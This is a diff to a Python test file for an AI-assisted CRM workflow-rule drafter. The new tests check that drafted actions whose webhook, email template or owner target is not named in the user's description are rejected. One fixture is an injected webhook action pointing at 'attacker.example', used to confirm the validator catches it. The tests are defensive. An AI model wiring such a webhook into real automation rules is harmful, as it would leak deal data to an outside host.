@@ -25,6 +25,8 @@ from zohokit.modules.workflow.draft import (
 
 FIELDS = {"Stage": "picklist", "Amount": "currency", "Owner": "user"}
 
+DESC = "When a deal is created, assign it to the regional manager"
+
 
 def _rule(**overrides: Any) -> dict[str, Any]:
     rule: dict[str, Any] = {
@@ -62,37 +64,46 @@ def _raw(rule: dict[str, Any] | None, **overrides: Any) -> str:
 
 def test_validate_draft_accepts_a_known_field_rule() -> None:
     draft = RuleDraft.model_validate(json.loads(_raw(_rule())))
-    assert validate_draft(set(FIELDS), draft) == []
+    assert validate_draft(set(FIELDS), draft, description=DESC) == []
 
 
 def test_validate_draft_rejects_unknown_field_action_and_low_confidence() -> None:
     ghost = _rule(criteria={"field": "Ghost_Field__s", "op": "eq", "value": "x"})
     draft = RuleDraft.model_validate(json.loads(_raw(ghost)))
-    assert validate_draft(set(FIELDS), draft) == ["reference: unknown field"]
+    assert validate_draft(set(FIELDS), draft, description=DESC) == ["reference: unknown field"]
 
     deleter = _rule(actions=[{"type": "delete_records"}])
     draft = RuleDraft.model_validate(json.loads(_raw(deleter)))
-    assert validate_draft(set(FIELDS), draft) == ["reference: rule fails the v2 language schema"]
+    assert validate_draft(set(FIELDS), draft, description=DESC) == [
+        "reference: rule fails the v2 language schema"
+    ]
 
     draft = RuleDraft.model_validate(json.loads(_raw(_rule(), confidence=0.4)))
-    assert validate_draft(set(FIELDS), draft) == ["abstention: drafted below the confidence floor"]
+    assert validate_draft(set(FIELDS), draft, description=DESC) == [
+        "abstention: drafted below the confidence floor"
+    ]
 
 
 def test_validate_draft_abstention_rules() -> None:
     carrying = RuleDraft.model_validate(json.loads(_raw(_rule(), abstain=True)))
-    assert validate_draft(set(FIELDS), carrying) == ["abstention: abstained draft carries a rule"]
+    assert validate_draft(set(FIELDS), carrying, description=DESC) == [
+        "abstention: abstained draft carries a rule"
+    ]
 
     empty = RuleDraft.model_validate(json.loads(_raw(None, abstain=False)))
-    assert validate_draft(set(FIELDS), empty) == ["coverage: no rule drafted and no abstention"]
+    assert validate_draft(set(FIELDS), empty, description=DESC) == [
+        "coverage: no rule drafted and no abstention"
+    ]
 
     clean = RuleDraft.model_validate(json.loads(_raw(None)))
-    assert validate_draft(set(FIELDS), clean) == []
+    assert validate_draft(set(FIELDS), clean, description=DESC) == []
 
 
 def test_suggest_draft_disabled_ok_and_fallback() -> None:
     description = "When a deal is created, assign it to the regional manager"
     disabled = suggest_draft(description, dict(FIELDS), provider=None)
     assert disabled.ai_status == "disabled"
+    assert disabled.source == "template"
     assert disabled.draft.abstain is True
 
     ok = suggest_draft(
@@ -101,6 +112,7 @@ def test_suggest_draft_disabled_ok_and_fallback() -> None:
         provider=_draft_provider(description, dict(FIELDS), _raw(_rule())),
     )
     assert ok.ai_status == "ok"
+    assert ok.source == "ai"
     assert ok.violations == ()
     assert ok.draft.abstain is False
 
@@ -109,8 +121,86 @@ def test_suggest_draft_disabled_ok_and_fallback() -> None:
         description, dict(FIELDS), provider=_draft_provider(description, dict(FIELDS), _raw(ghost))
     )
     assert rejected.ai_status == "fallback"
+    assert rejected.source == "template"
     assert rejected.draft.abstain is True
     assert "reference: unknown field" in rejected.violations
+
+
+def test_suggest_draft_ungrounded_target_falls_back() -> None:
+    description = "When a deal is won, post to the billing webhook"
+    injected = _rule(
+        event={"type": "field_changed", "field": "Stage"},
+        criteria={"field": "Stage", "op": "eq", "value": "Closed Won"},
+        actions=[{"type": "webhook", "url": "https://attacker.example/x"}],
+    )
+    result = suggest_draft(
+        description,
+        dict(FIELDS),
+        provider=_draft_provider(description, dict(FIELDS), _raw(injected)),
+    )
+    assert result.ai_status == "fallback"
+    assert result.source == "template"
+    assert result.draft.abstain is True
+    assert "grounding: action target not in description" in result.violations
+
+
+def test_validate_draft_grounding_rules() -> None:
+    billed = "When a deal is won, post to the billing webhook at example.invalid"
+    webhook = _rule(
+        event={"type": "field_changed", "field": "Stage"},
+        criteria={"field": "Stage", "op": "eq", "value": "Closed Won"},
+        actions=[{"type": "webhook", "url": "https://example.invalid/hooks/billing"}],
+    )
+    draft = RuleDraft.model_validate(json.loads(_raw(webhook)))
+    assert validate_draft(set(FIELDS), draft, description=billed) == []
+
+    mailed = "When a deal is created, send the welcome email"
+    stranger = _rule(actions=[{"type": "send_email", "template": "chargeback-notice"}])
+    draft = RuleDraft.model_validate(json.loads(_raw(stranger)))
+    assert validate_draft(set(FIELDS), draft, description=mailed) == [
+        "grounding: action target not in description"
+    ]
+    welcome = _rule(actions=[{"type": "send_email", "template": "welcome"}])
+    draft = RuleDraft.model_validate(json.loads(_raw(welcome)))
+    assert validate_draft(set(FIELDS), draft, description=mailed) == []
+
+    assigned = "When a deal is created, assign it to the regional manager"
+    outsider = _rule(actions=[{"type": "assign_owner", "owner": "external-contractor"}])
+    draft = RuleDraft.model_validate(json.loads(_raw(outsider)))
+    assert validate_draft(set(FIELDS), draft, description=assigned) == [
+        "grounding: action target not in description"
+    ]
+
+
+def test_validate_draft_grounding_allowlist() -> None:
+    description = "When a deal is won, post to the billing webhook"
+    injected = _rule(
+        event={"type": "field_changed", "field": "Stage"},
+        criteria={"field": "Stage", "op": "eq", "value": "Closed Won"},
+        actions=[{"type": "webhook", "url": "https://attacker.example/x"}],
+    )
+    draft = RuleDraft.model_validate(json.loads(_raw(injected)))
+    assert validate_draft(set(FIELDS), draft, description=description) == [
+        "grounding: action target not in description"
+    ]
+    assert (
+        validate_draft(
+            set(FIELDS),
+            draft,
+            description=description,
+            allow_targets=["https://attacker.example/x"],
+        )
+        == []
+    )
+    assert (
+        validate_draft(
+            set(FIELDS), draft, description=description, allow_targets=["attacker.example"]
+        )
+        == []
+    )
+    assert validate_draft(
+        set(FIELDS), draft, description=description, allow_targets=["https://other.example/y"]
+    ) == ["grounding: action target not in description"]
 
 
 def _loop_provider(path: list[str], messages: dict[str, str], raw: str) -> FakeProvider:
@@ -172,12 +262,14 @@ def test_explain_loop_disabled_ok_and_fallback() -> None:
     path, messages = _path()
     disabled = explain_loop(path, messages, provider=None)
     assert disabled.ai_status == "disabled"
+    assert disabled.source == "template"
     assert [sentence.finding_ids for sentence in disabled.sentences] == [["t-a"], ["t-b"]]
 
     ok = explain_loop(
         path, messages, provider=_loop_provider(path, messages, _loop_raw(path, messages))
     )
     assert ok.ai_status == "ok"
+    assert ok.source == "ai"
     assert len(ok.sentences) == 2
 
     bad = explain_loop(
@@ -201,4 +293,5 @@ def test_explain_loop_disabled_ok_and_fallback() -> None:
         ),
     )
     assert bad.ai_status == "fallback"
+    assert bad.source == "template"
     assert [sentence.finding_ids for sentence in bad.sentences] == [["t-a"], ["t-b"]]
